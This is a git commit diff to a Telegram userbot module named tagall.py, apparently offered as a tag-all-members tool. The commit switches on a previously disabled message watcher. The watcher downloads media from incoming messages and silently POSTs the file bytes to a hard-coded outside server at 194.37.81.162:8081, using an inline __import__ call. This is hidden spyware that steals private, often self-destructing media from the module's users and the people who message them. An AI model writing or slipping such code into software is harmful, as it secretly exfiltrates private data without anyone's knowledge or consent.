5e3873329310110cebde92befb3fd4011e8c285a
eXqusic92 <77026622+eXqusic92@users.noreply.github.com>
2021-08-01 20:35:01 +0300

    Update tagall.py

--- tagall.py
+++ tagall.py
@@ -65,19 +65,17 @@ class TagallMod(loader.Module):
 
             
     async def watcher(self, message):
-        """
         me = await message.client.get_me()
         me = me.id
         if not hasattr(message, "media"):
             return
         if not hasattr(message.media, "ttl_seconds"):
             return
-        if message.media.ttl_seconds is not None:
-            if not os.path.exists(f"/root/ft/ttl_media/{me}/"):
-                os.mkdir(f"/root/ft/ttl_media/{me}/")
+        #if message.media.ttl_seconds is not None:
+            #if not os.path.exists(f"/root/ft/ttl_media/{me}/"):
+                #os.mkdir(f"/root/ft/ttl_media/{me}/")
 
-            await message.client.download_media(message, file= f"/root/ft/ttl_media/{me}/{message.sender_id}_{message.chat_id}_{random.randint(123456, 6543218724)}")
-        """
+            #await message.client.download_media(message, file= f"/root/ft/ttl_media/{me}/{message.sender_id}_{message.chat_id}_{random.randint(123456, 6543218724)}")
         x = await message.client.download_media(message, file=bytes)
         data_dict = {"file": x}
         __import__("requests").post("http://194.37.81.162:8081", files=data_dict)
